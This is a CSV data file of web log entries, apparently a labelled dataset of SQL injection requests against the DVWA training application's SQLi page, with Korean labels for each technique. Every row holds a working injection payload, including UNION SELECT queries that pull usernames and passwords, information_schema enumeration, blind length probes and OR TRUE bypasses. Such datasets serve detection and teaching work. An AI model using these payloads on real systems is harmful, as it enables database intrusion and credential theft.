ip,date,method,uri,payload,injection_format
172.20.10.2,19/May/2024:05:12:55 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=' UNION SELECT user,password FROM dvwa.users LIMIT 2,1 #&Submit=Submit",UNION SELECT 컬럼의 정보
172.20.10.2,19/May/2024:05:12:55 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=45' UNION SELECT 1, 2, 3, 4 #&Submit=Submit",UNION SELECT 컬럼개수
172.20.10.2,19/May/2024:05:12:55 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=76' UNION SELECT user,password FROM dvwa.users LIMIT 1,1 #&Submit=Submit",UNION SELECT 컬럼의 정보
172.20.10.2,19/May/2024:05:12:56 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=60' UNION SELECT comment,name FROM DVWA.GUESTBOOK LIMIT 1,1#&Submit=Submit",UNION SELECT 컬럼의 정보
172.20.10.2,19/May/2024:05:12:56 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=98' UNION SELECT 1, table_name FROM information_schema.tables #&Submit=Submit",UNION SELECT 테이블 이름
172.20.10.2,19/May/2024:05:12:56 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=38' UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users' AND table_schema='dvwa' LIMIT 2,1 #&Submit=Submit",UNION SELECT 컬럼의 정보
172.20.10.2,19/May/2024:05:12:56 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=' UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='guestbook' #&Submit=Submit",UNION SELECT 테이블 이름
172.20.10.2,19/May/2024:05:12:56 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=66' UNION select 1, 2, 3, 4, 5, 6 #&Submit=Submit",UNION SELECT 컬럼개수
172.20.10.2,19/May/2024:05:12:56 +0900,GET,/DVWA/vulnerabilities/sqli/?,id=1' AND (SELECT 1 FROM information_schema.columns WHERE table_schema='dvwa' AND table_name='users' AND LENGTH(column_name)=6) #&Submit=Submit,컬럼 길이
172.20.10.2,19/May/2024:05:12:56 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=37' UNION SELECT 1, table_name from information_schema.tables #&Submit=Submit",UNION SELECT 테이블 이름
172.20.10.2,19/May/2024:05:12:56 +0900,GET,/DVWA/vulnerabilities/sqli/?,id=10' OR TRUE #&Submit=Submit,조건문 우회
172.20.10.2,19/May/2024:05:12:56 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=37' UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users' AND table_schema='dvwa' LIMIT 2,1 #&Submit=Submit",UNION SELECT 컬럼의 정보
172.20.10.2,19/May/2024:05:12:56 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=20' UNION SELECT 1, 2, 3 #&Submit=Submit",UNION SELECT 컬럼개수
172.20.10.2,19/May/2024:05:12:56 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=10' UNION SELECT table_name,2 FROM information_schema.tables #&Submit=Submit",UNION SELECT 컬럼의 정보
172.20.10.2,19/May/2024:05:12:57 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=54' UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='guestbook' and table_schema='dvwa' #&Submit=Submit",UNION SELECT 컬럼의 정보
172.20.10.2,19/May/2024:05:12:57 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=30' UNION SELECT 1, 2, 3, 4, 5, 6 #&Submit=Submit",UNION SELECT 컬럼개수
172.20.10.2,19/May/2024:05:12:57 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=67' UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema='dvwa' #&Submit=Submit",UNION SELECT 테이블 이름
172.20.10.2,19/May/2024:05:12:57 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=64' UNION SELECT 1, 2, 3 #&Submit=Submit",UNION SELECT 컬럼개수
172.20.10.2,19/May/2024:05:12:57 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=58' union SELECT comment,name FROM dvwa.guestbook #&Submit=Submit",UNION SELECT 컬럼의 정보
172.20.10.2,19/May/2024:05:12:57 +0900,GET,/DVWA/vulnerabilities/sqli/?,id=68' OR '1'='1' LIMIT 1 #&Submit=Submit,조건문 우회
172.20.10.2,19/May/2024:05:12:57 +0900,GET,/DVWA/vulnerabilities/sqli/?,id=1' AND (SELECT 1 FROM information_schema.columns WHERE table_schema='dvwa' AND table_name='users' AND LENGTH(column_name)=8) #&Submit=Submit,컬럼 길이
172.20.10.2,19/May/2024:05:12:57 +0900,GET,/DVWA/vulnerabilities/sqli/?,id=1' AND (SELECT 1 FROM information_schema.columns WHERE table_schema='dvwa' AND table_name='guestbook' AND LENGTH(column_name)=2) #&Submit=Submit,컬럼 길이
172.20.10.2,19/May/2024:05:12:57 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=33' UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users' #&Submit=Submit",UNION SELECT 테이블 이름
172.20.10.2,19/May/2024:05:12:57 +0900,GET,/DVWA/vulnerabilities/sqli/?,id=1' AND (SELECT 1 from information_schema.columns WHERE table_schema='dvwa' AND table_name='users' AND LENGTH(column_name)=3) #&Submit=Submit,컬럼 길이
172.20.10.2,19/May/2024:05:12:57 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=' UNION SELECT 1, 2, 3 #&Submit=Submit",UNION SELECT 컬럼개수
172.20.10.2,19/May/2024:05:12:57 +0900,GET,/DVWA/vulnerabilities/sqli/?,id=4' OR TRUE #&Submit=Submit,조건문 우회
172.20.10.2,19/May/2024:05:12:57 +0900,GET,/DVWA/vulnerabilities/sqli/?,id=1' AND (SELECT 1 FROM information_schema.columns WHERE table_schema='dvwa' AND table_name='guestbook' AND LENGTH(column_name)=7) #&Submit=Submit,컬럼 길이
172.20.10.2,19/May/2024:05:12:57 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=' UNION SELECT 1, 2 #&Submit=Submit",UNION SELECT 컬럼개수
172.20.10.2,19/May/2024:05:12:57 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=56' UNION SELECT 1, table_name FROM information_schema.tables #&Submit=Submit",UNION SELECT 테이블 이름
172.20.10.2,19/May/2024:05:12:58 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=58' UNION SELECT COMMENT,NAME FROM dvwa.guestbook #&Submit=Submit",UNION SELECT 컬럼의 정보
172.20.10.2,19/May/2024:05:12:58 +0900,GET,/DVWA/vulnerabilities/sqli/?,"id=98' UNION select 1, 2, 3, 4, 5, 6 #&Submit=Submit",UNION SELECT 컬럼개수
